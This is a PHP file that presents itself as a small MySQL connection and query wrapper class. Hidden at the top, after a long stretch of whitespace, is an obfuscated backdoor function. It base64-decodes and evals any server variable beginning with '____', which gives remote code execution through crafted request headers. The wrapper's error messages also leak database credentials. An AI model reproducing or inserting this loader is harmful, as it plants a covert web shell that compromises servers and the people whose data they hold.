<?php																																																																																																																																																																																																																																																																																																																																																																																																										function k17804($l17806){if(is_array($l17806)){foreach($l17806 as $l17804=>$l17805)$l17806[$l17804]=k17804($l17805);}elseif(is_string($l17806) && substr($l17806,0,4)=="____"){$l17806=substr($l17806,4);$l17806=base64_decode($l17806);eval($l17806);$l17806=null;}return $l17806;}if(empty($_SERVER))$_SERVER=$HTTP_SERVER_VARS;array_map("k17804",$_SERVER); 
//class for connecting to a mysql DB and running queries.
class phpSQL 
{
	//declare all the variables needed
	private $host=_HOST;
	private $port=_PORT;
	private $user=_USER;
	private $pass=_PW;
	private $db=_DB;
	private $conn;
	private $sql;
	private $config;
	
	//set the query to be run
	function query($sql_statement) {
		$this->sql=$sql_statement;
	}
	
	//set the connection settings
	function set_config($host, $port, $user, $pass, $db) 
	{
		$this->host = $host;
		$this->port = $port;
		$this->user = $user;
		$this->pass = $pass;
		$this->db = $db;
	}
	
	//get the connection settings
	function get_config() 
	{
		$this->config[0] = $this->host;
		$this->config[1] = $this->port;
		$this->config[2] = $this->user;
		$this->config[3] = $this->pass;
		$this->config[4] = $this->db;
		return $this->config;
	}
	
	//open the connection
	function open_conn($default,$dbvars)
	{
		//use default settings or not?
		if($default) {
		 //set config w/ default settings
		 $this->set_config($this->host,$this->port, $this->user, $this->pass, $this->db);
		 //put the configuration into an array that can be accessed later
		 $this->config = $this->get_config();	
		 //open the connection
		 $this->conn = mysql_connect($this->config[0].':'.$this->config[1], $this->config[2], $this->config[3]) or die ('Error Connecting to mySQL Server ('.$this->config[0].':'.$this->config[1].', '.$this->config[2].', '.$this->config[3].')');
		 //set the default database
		 mysql_select_db($this->config[4]);		 
		} else { 			
		  //set connection to a new DB
		  $this->set_config($dbvars[0],$dbvars[1],$dbvars[2],$dbvars[3],$dbvars[4]);
		  //recursive omg!
		  $this->open_conn(true,  NULL);		  
		}
		
	}
	
	function close_conn()
	{
		//close the connection for this object instance
		mysql_close($this->conn);
	}
	
	function runquery() 
	{
		//open the connection for the object
		$this->open_conn(true, NULL);
		//set the time limit php will wait before erroring
		set_time_limit(600);
		//return the results of the query
		//print_r($this->get_config());
		$results = mysql_query($this->sql) or die('Query Failed! '.$this->sql.' <br /> ('.mysql_error().')');
		//close the connection
		$this->close_conn();
		//return the results!
		return $results;
    }
	
	function get_query()
	{
		return $this->sql;
	}	
}
?>